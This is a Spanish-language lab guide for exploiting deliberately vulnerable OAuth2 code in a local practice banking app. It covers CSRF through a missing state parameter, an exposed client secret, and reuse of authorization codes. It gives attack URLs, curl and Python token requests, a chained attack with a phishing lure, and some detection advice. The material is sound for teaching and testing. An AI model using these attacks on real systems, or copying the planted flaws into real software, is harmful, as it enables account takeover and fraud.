# 🎯 Guía Práctica de Explotación - OAuth2

## 📖 Tutorial Paso a Paso

Esta guía te muestra **exactamente** cómo explotar las vulnerabilidades OAuth2 implementadas.

---

## 🔴 ATAQUE 1: CSRF OAuth (State Parameter Missing)

### 🎭 Escenario
Un atacante quiere vincular la cuenta bancaria de una víctima con su propia sesión OAuth para acceder a los fondos de la víctima.

### 👤 Actores
- **Atacante:** hacker@fakegoogle.com
- **Víctima:** usuario@fakegoogle.com

### 📝 Pasos del Ataque

#### Paso 1: Preparación del Atacante

1. **Abrir navegador en modo normal** (este será el atacante)
2. Ir a: `http://127.0.0.1:5000`
3. Hacer clic en "Ingresar"
4. Hacer clic en "Iniciar sesión con FakeGoogle"

#### Paso 2: Login del Atacante (NO completar)

1. En la pantalla de FakeGoogle, ingresar:
   - **Email:** `hacker@fakegoogle.com`
   - **Password:** `hacker123`
2. Hacer clic en "Iniciar sesión"
3. **¡IMPORTANTE!** En la pantalla de autorización, **NO HACER CLIC** en "Permitir acceso"

#### Paso 3: Capturar URL Maliciosa

1. En la pantalla de autorización (donde dice "Banco Nacional quiere acceder a tu cuenta")
2. Copiar la **URL completa** de la barra de direcciones
3. La URL será algo como:
   ```
   http://127.0.0.1:5000/oauth/fakegoogle/authorize?
     redirect_uri=http://127.0.0.1:5000/oauth/fakegoogle/callback
     &state=
     &client_id=banco-app-123456
   ```
4. **Guardar esta URL** - es tu arma de ataque

#### Paso 4: Preparar Sesión de la Víctima

1. **Abrir ventana de incógnito** o **otro navegador** (este será la víctima)
2. **NO CERRAR** la ventana del atacante

#### Paso 5: Engañar a la Víctima

1. En la ventana de incógnito (víctima), **pegar la URL maliciosa** que copiaste
2. La víctima verá la pantalla de login de FakeGoogle
3. **Nota:** En un ataque real, enviarías esta URL por email, mensaje, etc.

#### Paso 6: Víctima Completa el Flujo

1. La víctima ingresa SUS credenciales:
   - **Email:** `usuario@fakegoogle.com`
   - **Password:** `fakegoogle123`
2. Hacer clic en "Iniciar sesión"
3. En la pantalla de autorización, hacer clic en "Permitir acceso"

#### Paso 7: ¡Ataque Exitoso!

1. La cuenta bancaria se crea/vincula con el perfil OAuth del usuario
2. **PERO** la autorización la completó la víctima
3. **Volver a la ventana del atacante**
4. El atacante ahora puede completar el flujo y acceder a la cuenta

### 🔍 ¿Por Qué Funciona?

```python
# En el código vulnerable, NO se valida el state:
state = request.args.get('state', '')  # ❌ Se acepta cualquier state
# No hay validación como:
# if state != session.get('original_state'):
#     abort(403)
```

### 💡 Variación Avanzada

Puedes hacer que el state esté vacío o con cualquier valor:

```
# URL con state vacío
http://127.0.0.1:5000/oauth/fakegoogle/authorize?redirect_uri=...&state=&client_id=...

# URL con state falso
http://127.0.0.1:5000/oauth/fakegoogle/authorize?redirect_uri=...&state=MALICIOSO123&client_id=...
```

Ambas funcionan porque **no se valida**.

---

## 🔴 ATAQUE 2: Client Secret Exposed

### 🎭 Escenario
Un atacante quiere obtener tokens de acceso sin pasar por el flujo OAuth completo.

### 📝 Pasos del Ataque

#### Método 1: Obtención desde Web

1. Ir a: `http://127.0.0.1:5000/oauth/info`
2. **¡Boom!** Todas las credenciales expuestas:
   ```
   CLIENT_ID:     banco-app-123456
   CLIENT_SECRET: SECRET_SUPER_SECRETO_EXPUESTO_123
   JWT_SECRET:    jwt_secret_debil
   ```
3. Copiar el `CLIENT_SECRET`

#### Método 2: Desde JavaScript (DevTools)

1. Ir a cualquier página del banco
2. Presionar `F12` para abrir DevTools
3. Ir a la consola
4. Escribir:
   ```javascript
   fetch('/oauth/info')
     .then(r => r.text())
     .then(html => console.log(html))
   ```
5. Ver las credenciales en la respuesta

#### Método 3: Ver código fuente

1. En la página `/oauth/info`
2. Presionar `Ctrl+U` (ver código fuente)
3. Buscar: "CLIENT_SECRET"
4. Está en texto plano en el HTML

### 💣 Explotación del Secret

Una vez que tienes el `CLIENT_SECRET`, puedes:

#### A) Obtener Token con Código Válido

```bash
# Primero, completa el flujo OAuth normal para obtener un código
# Luego, usa curl para obtener el token:

curl -X POST http://127.0.0.1:5000/oauth/fakegoogle/token \
  -H "Content-Type: application/json" \
  -d '{
    "code": "CODIGO_QUE_OBTUVISTE",
    "client_id": "banco-app-123456",
    "client_secret": "SECRET_SUPER_SECRETO_EXPUESTO_123"
  }'
```

#### B) Usar Python para automatizar

```python
import requests

# Credenciales expuestas
CLIENT_ID = "banco-app-123456"
CLIENT_SECRET = "SECRET_SUPER_SECRETO_EXPUESTO_123"

# Obtener token (necesitas un código válido primero)
response = requests.post('http://127.0.0.1:5000/oauth/fakegoogle/token', json={
    'code': 'TU_CODIGO_AQUI',
    'client_id': CLIENT_ID,
    'client_secret': CLIENT_SECRET
})

print(response.json())
```

### 🔍 ¿Por Qué es Peligroso?

1. **Cualquiera puede hacerse pasar por la aplicación**
2. **No necesitas el flujo OAuth completo**
3. **Puedes automatizar ataques masivos**
4. **El usuario no necesita autorizar nada**

---

## 🔴 ATAQUE 3: Reutilización de Códigos

### 🎭 Escenario
Los códigos de autorización NO se invalidan después del primer uso.

### 📝 Pasos del Ataque

#### Paso 1: Interceptar un Código

1. Completar el flujo OAuth normal
2. Al llegar al callback, copiar el parámetro `code` de la URL:
   ```
   http://127.0.0.1:5000/oauth/fakegoogle/callback?code=CODIGO_AQUI&state=
   ```
3. Guardar el código

#### Paso 2: Reutilizar el Código

1. En otra sesión/navegador, usar el mismo código
2. El código **todavía funciona** aunque ya fue usado

```bash
# Usar el mismo código múltiples veces
curl -X POST http://127.0.0.1:5000/oauth/fakegoogle/token \
  -H "Content-Type: application/json" \
  -d '{
    "code": "CODIGO_YA_USADO",
    "client_id": "banco-app-123456",
    "client_secret": "SECRET_SUPER_SECRETO_EXPUESTO_123"
  }'

# ¡Funciona! Devuelve un token nuevo
```

### 🔍 ¿Por Qué Funciona?

```python
# El código vulnerable no marca como usado:
authorization_codes[auth_code] = {
    'user_info': user_info,
    'timestamp': time.time(),
    'used': False  # ❌ Se guarda pero nunca se verifica
}

# En el intercambio de token, no hay validación:
if code in authorization_codes:  # ❌ No verifica si ya fue usado
    # Generar token...
```

---

## 🎯 Ataque Completo: Cadena de Explotación

### Objetivo: Acceso total sin autorización del usuario

#### Paso 1: Reconocimiento
```bash
# Obtener credenciales
curl http://127.0.0.1:5000/oauth/info
```

#### Paso 2: CSRF Setup
```
# Generar URL maliciosa
http://127.0.0.1:5000/oauth/fakegoogle/login?
  redirect_uri=http://127.0.0.1:5000/oauth/fakegoogle/callback
  &state=ATACANTE_123
  &client_id=banco-app-123456
```

#### Paso 3: Social Engineering
```
Enviar a víctima:
"¡Hola! El banco tiene una promoción especial.
Haz clic aquí para reclamar tu bono: [URL_MALICIOSA]"
```

#### Paso 4: Víctima Cae
- Víctima hace clic
- Inicia sesión pensando que es legítimo
- Autoriza la aplicación

#### Paso 5: Atacante Obtiene Acceso
- Código generado va al callback
- Atacante intercambia código por token usando CLIENT_SECRET
- Acceso completo a la cuenta bancaria

---

## 🛡️ Detección de las Vulnerabilidades

### Cómo saber si estás siendo atacado:

#### 1. State Mismatch
```python
# Agregar logging
print(f"State recibido: {request.args.get('state')}")
print(f"State esperado: {session.get('oauth_state')}")
# Si no coinciden = ataque CSRF
```

#### 2. Client Secret Comprometido
```python
# Monitorear peticiones sospechosas
# Múltiples peticiones con diferentes códigos
# Peticiones desde IPs extrañas
```

#### 3. Reutilización de Códigos
```python
# Llevar registro de códigos usados
if authorization_codes[code]['used']:
    log_security_event("Code reuse detected!")
```

---

## 📊 Matriz de Impacto

| Vulnerabilidad | Severidad | Facilidad | Impacto | Detección |
|----------------|-----------|-----------|---------|-----------|
| State Missing (CSRF) | 🔴 Alta | 🟡 Media | Secuestro de cuenta | Difícil |
| Client Secret Exposed | 🔴 Crítica | 🟢 Fácil | Control total OAuth | Muy Difícil |
| Code Reuse | 🟠 Media | 🟡 Media | Múltiples tokens | Media |

---

## 🔧 Herramientas Útiles

### Burp Suite
- Interceptar peticiones OAuth
- Modificar parámetros state
- Repetir peticiones (code reuse)

### Browser DevTools
- Ver credenciales en código
- Manipular localStorage/sessionStorage
- Interceptar peticiones AJAX

### Curl/Postman
- Hacer peticiones directas al token endpoint
- Probar diferentes combinaciones

### Script de Demo
```bash
python demo_oauth_vulnerabilities.py
```

---

## ⚠️ Recordatorio Ético

**Estas técnicas son SOLO para:**
- ✅ Este laboratorio
- ✅ Entornos de práctica propios
- ✅ CTFs y competencias legales
- ✅ Pentesting con autorización escrita

**NUNCA:**
- ❌ Atacar sistemas reales
- ❌ Usar sin permiso
- ❌ Con fines maliciosos

---

## 📚 Recursos Adicionales

- [OWASP OAuth 2.0](https://owasp.org/www-community/vulnerabilities/OAuth_2.0)
- [OAuth 2.0 Security Best Practices](https://tools.ietf.org/html/draft-ietf-oauth-security-topics)
- [OAuth 2.0 Threat Model](https://tools.ietf.org/html/rfc6819)

---

**Happy Ethical Hacking! 🎓**
